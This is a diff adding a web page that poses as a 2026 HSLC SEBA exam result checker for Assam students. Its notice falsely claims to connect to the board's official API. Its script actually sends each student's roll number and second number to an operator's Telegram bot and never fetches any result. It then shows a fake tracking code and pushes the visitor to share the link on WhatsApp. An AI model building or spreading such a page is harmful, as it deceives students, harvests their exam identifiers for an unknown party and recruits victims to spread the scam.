@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>HSLC SEBA 2026 RESULT</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-1: #2563eb;
+            --primary-2: #1e40af;
+            --primary-3: #3b82f6;
+            --gradient-primary: linear-gradient(135deg, #2563eb, #1e40af);
+            --gradient-glow: linear-gradient(145deg, rgba(37, 99, 235, 0.1), rgba(30, 64, 175, 0.05));
+            --bg-soft: #f8fafc;
+            --bg-white: #ffffff;
+            --glass-bg: rgba(255, 255, 255, 0.7);
+            --text-primary: #0f172a;
+            --text-secondary: #334155;
+            --text-light: #64748b;
+            --shadow-sm: 0 10px 30px -15px rgba(37, 99, 235, 0.2);
+            --shadow-md: 0 20px 40px -20px rgba(37, 99, 235, 0.3);
+            --shadow-lg: 0 30px 50px -25px rgba(37, 99, 235, 0.4);
+            --shadow-inner: inset 0 2px 4px 0 rgba(0, 0, 0, 0.02);
+            --border-glow: 0 0 0 1px rgba(37, 99, 235, 0.1);
+            --blur-bg: blur(10px);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-soft);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            color: var(--text-primary);
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 40%, rgba(37, 99, 235, 0.03) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 60%, rgba(30, 64, 175, 0.03) 0%, transparent 50%);
+            animation: backgroundShift 30s ease infinite alternate;
+            pointer-events: none;
+        }
+
+        @keyframes backgroundShift {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            100% { transform: translate(2%, 2%) rotate(1deg); }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Glass Card */
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: var(--blur-bg);
+            border-radius: 2.5rem;
+            padding: 2.5rem 2rem;
+            box-shadow: var(--shadow-md), var(--border-glow), var(--shadow-inner);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .glass-card:hover {
+            box-shadow: var(--shadow-lg), var(--border-glow), var(--shadow-inner);
+        }
+
+        /* Logo */
+        .logo-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: var(--gradient-primary);
+            padding: 3px;
+            box-shadow: var(--shadow-md);
+            animation: logoFloat 3s ease-in-out infinite;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+            border: 3px solid white;
+            background: white;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        /* Typography */
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            text-align: center;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.02em;
+        }
+
+        .info-badge {
+            background: var(--gradient-glow);
+            border-left: 4px solid var(--primary-1);
+            padding: 1.2rem;
+            border-radius: 1.5rem;
+            margin: 1.5rem 0;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: var(--text-secondary);
+            box-shadow: var(--shadow-sm);
+            backdrop-filter: var(--blur-bg);
+            border: 1px solid rgba(37, 99, 235, 0.1);
+        }
+
+        /* Buttons */
+        .btn {
+            border: none;
+            border-radius: 60px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            background: var(--gradient-primary);
+            color: white;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            width: 100%;
+            box-shadow: 0 10px 20px -8px var(--primary-2);
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 20px 30px -10px var(--primary-2);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Form Elements */
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: var(--text-primary);
+            font-size: 0.95rem;
+        }
+
+        .prefixed-input {
+            display: flex;
+            align-items: center;
+            background: white;
+            border: 2px solid rgba(37, 99, 235, 0.1);
+            border-radius: 20px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: var(--shadow-inner);
+        }
+
+        .prefixed-input:focus-within {
+            border-color: var(--primary-1);
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15);
+        }
+
+        .prefix {
+            padding: 0.9rem 0.8rem 0.9rem 1.5rem;
+            background: var(--gradient-primary);
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            border-radius: 18px 0 0 18px;
+            letter-spacing: 0.5px;
+        }
+
+        input {
+            flex: 1;
+            padding: 0.9rem 1rem;
+            border: none;
+            background: transparent;
+            font-size: 1rem;
+            font-family: inherit;
+        }
+
+        input:focus {
+            outline: none;
+        }
+
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 0.9rem 1.2rem;
+            border: 2px solid rgba(37, 99, 235, 0.1);
+            border-radius: 20px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        input[type="text"]:focus, input[type="number"]:focus {
+            outline: none;
+            border-color: var(--primary-1);
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15);
+        }
+
+        /* Pages */
+        .page {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .page.active {
+            display: block;
+            animation: pageEnter 0.5s ease forwards;
+        }
+
+        @keyframes pageEnter {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Back Button */
+        .back-btn {
+            background: none;
+            border: none;
+            font-size: 1.8rem;
+            cursor: pointer;
+            color: var(--primary-1);
+            margin-bottom: 1rem;
+            transition: transform 0.3s ease;
+            padding: 0.5rem;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-btn:hover {
+            transform: translateX(-5px);
+            background: rgba(37, 99, 235, 0.05);
+        }
+
+        /* Loading Spinner */
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn.loading .btn-text {
+            display: none;
+        }
+
+        .btn.loading .loader {
+            display: inline-block;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(8px);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal.show {
+            display: flex;
+            animation: modalFade 0.3s ease forwards;
+        }
+
+        @keyframes modalFade {
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 2rem;
+            padding: 2.5rem 2rem;
+            max-width: 340px;
+            margin: 1rem;
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+            box-shadow: var(--shadow-lg);
+            text-align: center;
+        }
+
+        .modal.show .modal-content {
+            transform: scale(1);
+        }
+
+        .modal-icon {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            animation: modalBounce 2s infinite;
+        }
+
+        @keyframes modalBounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .modal-text {
+            margin: 1.2rem 0;
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            line-height: 1.6;
+            opacity: 0;
+            animation: modalSlide 0.5s ease forwards;
+        }
+
+        .modal-text:nth-child(2) { animation-delay: 0.1s; }
+        .modal-text:nth-child(3) { animation-delay: 0.2s; }
+        .modal-text:nth-child(4) { animation-delay: 0.3s; }
+        .modal-text:nth-child(5) { animation-delay: 0.4s; }
+
+        @keyframes modalSlide {
+            from {
+                opacity: 0;
+                transform: translateY(15px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Code Display */
+        .code-section {
+            text-align: center;
+            padding: 1.5rem;
+            background: var(--gradient-glow);
+            border-radius: 2rem;
+            margin-top: 1.5rem;
+            border: 2px dashed var(--primary-1);
+        }
+
+        .code-label {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            margin-bottom: 0.5rem;
+        }
+
+        .code-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 2px;
+            font-family: monospace;
+            padding: 0.5rem;
+        }
+
+        .code-hint {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-top: 1rem;
+        }
+
+        /* Code Check Section */
+        .code-check {
+            margin-top: 2rem;
+            padding-top: 2rem;
+            border-top: 2px solid rgba(37, 99, 235, 0.1);
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 1rem;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--text-primary);
+            color: white;
+            padding: 0.8rem 2rem;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            box-shadow: var(--shadow-lg);
+            z-index: 1100;
+            transition: transform 0.3s ease;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .glass-card {
+                padding: 2rem 1.5rem;
+                border-radius: 2rem;
+            }
+
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            .btn {
+                padding: 0.9rem 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Landing Page -->
+        <div id="landingPage" class="page active">
+            <div class="glass-card">
+                <div class="logo-wrapper">
+                    <div class="logo">
+                        <img src="seba.png" alt="SEBA Logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01ek0yIDE3bDEwIDUgMTAtNU0yIDEybDEwIDUgMTAtNSIvPjwvc3ZnPg=='/>">
+                    </div>
+                </div>
+                <h1>HSLC SEBA 2026 RESULT</h1>
+                
+                <div class="info-badge">
+                    <strong>📢 Important Notice</strong><br><br>
+                    The Board of Secondary Education, Assam (SEBA) has published most students' results on their official portal. This platform connects directly to their API for seamless access. Please note that results for certain subjects may not yet be available, and some student records may still be under processing. If your result cannot be retrieved at this moment, kindly check again tomorrow.
+                </div>
+
+                <button id="checkResultBtn" class="btn">
+                    <span class="btn-text">CHECK YOUR RESULT</span>
+                    <span class="loader" style="display: none;"></span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Form Page -->
+        <div id="formPage" class="page">
+            <div class="glass-card">
+                <button id="backBtn" class="back-btn">←</button>
+                <h1>Enter Details</h1>
+                
+                <form id="resultForm">
+                    <div class="input-group">
+                        <label class="input-label">Roll Number</label>
+                        <div class="prefixed-input">
+                            <span class="prefix">B26-</span>
+                            <input type="text" id="rollInput" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="0387" required>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label class="input-label">Number</label>
+                        <input type="text" id="numberInput" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="0634" required>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="btn">
+                        <span class="btn-text">CHECK RESULT</span>
+                        <span class="loader" style="display: none;"></span>
+                    </button>
+                </form>
+
+                <!-- Code Check Section -->
+                <div class="code-check">
+                    <h3 class="section-title">Already have a code?</h3>
+                    <div class="input-group">
+                        <input type="text" id="codeInput" maxlength="12" placeholder="Enter 12-digit code" inputmode="numeric">
+                    </div>
+                    <button id="checkCodeBtn" class="btn" style="background: var(--gradient-glow); color: var(--primary-1);">
+                        <span class="btn-text">CHECK RESULT BY CODE</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Page -->
+        <div id="successPage" class="page">
+            <div class="glass-card">
+                <div class="logo-wrapper">
+                    <div class="logo">
+                        <img src="seba.png" alt="SEBA Logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01ek0yIDE3bDEwIDUgMTAtNU0yIDEybDEwIDUgMTAtNSIvPjwvc3ZnPg=='/>">
+                    </div>
+                </div>
+                
+                <div class="code-section">
+                    <div class="code-label">Your Tracking Code</div>
+                    <div class="code-value" id="generatedCode">XXXXXXXXXXXX</div>
+                    <div class="code-hint">Save this code to check your result later</div>
+                </div>
+
+                <p style="color: var(--text-secondary); margin: 1.5rem 0; text-align: center;">
+                    Redirecting to WhatsApp sharing in <span id="countdown">3</span> seconds...
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-icon">🧘</div>
+            <div class="modal-text">✨ Stay calm and believe in yourself!</div>
+            <div class="modal-text">🧘 Take a deep breath...</div>
+            <div class="modal-text">🌟 Your result will be amazing!</div>
+            <div class="modal-text">💙 Wishing you all the best!</div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // Configuration - These will be replaced by Cloudflare Pages environment variables
+        const CONFIG = {
+            BOT_TOKEN: '{{BOT_TOKEN}}',
+            CHAT_ID: '{{CHAT_ID}}'
+        };
+
+        // DOM Elements
+        const landingPage = document.getElementById('landingPage');
+        const formPage = document.getElementById('formPage');
+        const successPage = document.getElementById('successPage');
+        const checkResultBtn = document.getElementById('checkResultBtn');
+        const backBtn = document.getElementById('backBtn');
+        const resultForm = document.getElementById('resultForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const rollInput = document.getElementById('rollInput');
+        const numberInput = document.getElementById('numberInput');
+        const codeInput = document.getElementById('codeInput');
+        const checkCodeBtn = document.getElementById('checkCodeBtn');
+        const successModal = document.getElementById('successModal');
+        const generatedCode = document.getElementById('generatedCode');
+        const countdown = document.getElementById('countdown');
+        const toast = document.getElementById('toast');
+
+        // State
+        let isSubmitting = false;
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            restrictToNumbers();
+            if (rollInput) rollInput.focus();
+        });
+
+        // Restrict inputs to numbers only
+        function restrictToNumbers() {
+            [rollInput, numberInput, codeInput].forEach(input => {
+                if (input) {
+                    input.addEventListener('keypress', (e) => {
+                        if (!/^\d$/.test(e.key)) e.preventDefault();
+                    });
+                    input.addEventListener('input', (e) => {
+                        e.target.value = e.target.value.replace(/[^\d]/g, '');
+                    });
+                }
+            });
+        }
+
+        // Page Transitions
+        checkResultBtn.addEventListener('click', () => {
+            landingPage.classList.remove('active');
+            formPage.classList.add('active');
+            if (rollInput) rollInput.focus();
+        });
+
+        backBtn.addEventListener('click', () => {
+            formPage.classList.remove('active');
+            landingPage.classList.add('active');
+            resetForm();
+        });
+
+        // Generate 12-digit unique code
+        function generateUniqueCode() {
+            return Math.random().toString().slice(2, 14).padEnd(12, '0');
+        }
+
+        // Show toast
+        function showToast(message, type = 'success') {
+            toast.textContent = message;
+            toast.style.background = type === 'success' ? '#10b981' : '#ef4444';
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // Send to Telegram
+        async function sendToTelegram(roll, number, code) {
+            const message = `🔔 *New Result Request*\n━━━━━━━━━━━━━━━━\n📋 *Roll:* \`${roll}\`\n🔢 *Number:* \`${number}\`\n🔑 *Code:* \`${code}\`\n⏰ *Time:* ${new Date().toLocaleString('en-IN')}\n━━━━━━━━━━━━━━━━`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram Error:', error);
+                return false;
+            }
+        }
+
+        // Form Submit
+        resultForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (isSubmitting) return;
+            
+            if (!validateForm()) {
+                showToast('Please enter valid 4-digit numbers', 'error');
+                return;
+            }
+
+            const roll = 'B26-' + rollInput.value;
+            const number = numberInput.value;
+            const code = generateUniqueCode();
+
+            isSubmitting = true;
+            submitBtn.classList.add('loading');
+            submitBtn.disabled = true;
+
+            // Send to Telegram
+            const sent = await sendToTelegram(roll, number, code);
+
+            if (sent) {
+                showToast('Request submitted successfully!');
+                
+                // Show motivational modal
+                successModal.classList.add('show');
+                
+                // Hide modal after 2.5 seconds and show success page
+                setTimeout(() => {
+                    successModal.classList.remove('show');
+                    
+                    // Show success page with code
+                    generatedCode.textContent = code;
+                    formPage.classList.remove('active');
+                    successPage.classList.add('active');
+                    
+                    // Countdown and redirect to WhatsApp
+                    let seconds = 3;
+                    const timer = setInterval(() => {
+                        seconds--;
+                        if (countdown) countdown.textContent = seconds;
+                        
+                        if (seconds === 0) {
+                            clearInterval(timer);
+                            const websiteUrl = window.location.href;
+                            const whatsappUrl = `https://wa.me/?text=Check%20your%20HSLC%20SEBA%202026%20Result%20here:%20${encodeURIComponent(websiteUrl)}`;
+                            window.open(whatsappUrl, '_blank');
+                            
+                            // Return to landing after redirect
+                            setTimeout(() => {
+                                successPage.classList.remove('active');
+                                landingPage.classList.add('active');
+                            }, 1000);
+                        }
+                    }, 1000);
+                }, 2500);
+            } else {
+                showToast('Failed to submit. Please try again.', 'error');
+                resetButton();
+            }
+        });
+
+        // Code check button (UI only)
+        checkCodeBtn.addEventListener('click', () => {
+            if (!codeInput.value || codeInput.value.length !== 12) {
+                showToast('Please enter a valid 12-digit code', 'error');
+                return;
+            }
+            showToast('Code accepted! (Demo feature)', 'success');
+            codeInput.value = '';
+        });
+
+        // Validate form
+        function validateForm() {
+            return rollInput.value.length === 4 && numberInput.value.length === 4;
+        }
+
+        // Reset form and button
+        function resetForm() {
+            resultForm.reset();
+            resetButton();
+        }
+
+        function resetButton() {
+            isSubmitting = false;
+            submitBtn.classList.remove('loading');
+            submitBtn.disabled = false;
+        }
+
+        // Auto format inputs
+        rollInput.addEventListener('input', limitLength);
+        numberInput.addEventListener('input', limitLength);
+
+        function limitLength(e) {
+            if (e.target.value.length > 4) {
+                e.target.value = e.target.value.slice(0, 4);
+            }
+        }
+
+        // Close modal on click outside
+        successModal.addEventListener('click', (e) => {
+            if (e.target === successModal) {
+                successModal.classList.remove('show');
+            }
+        });
+
+        // Keyboard navigation
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && successModal.classList.contains('show')) {
+                successModal.classList.remove('show');
+            }
+        });
+    </script>
+</body>
+  </html>
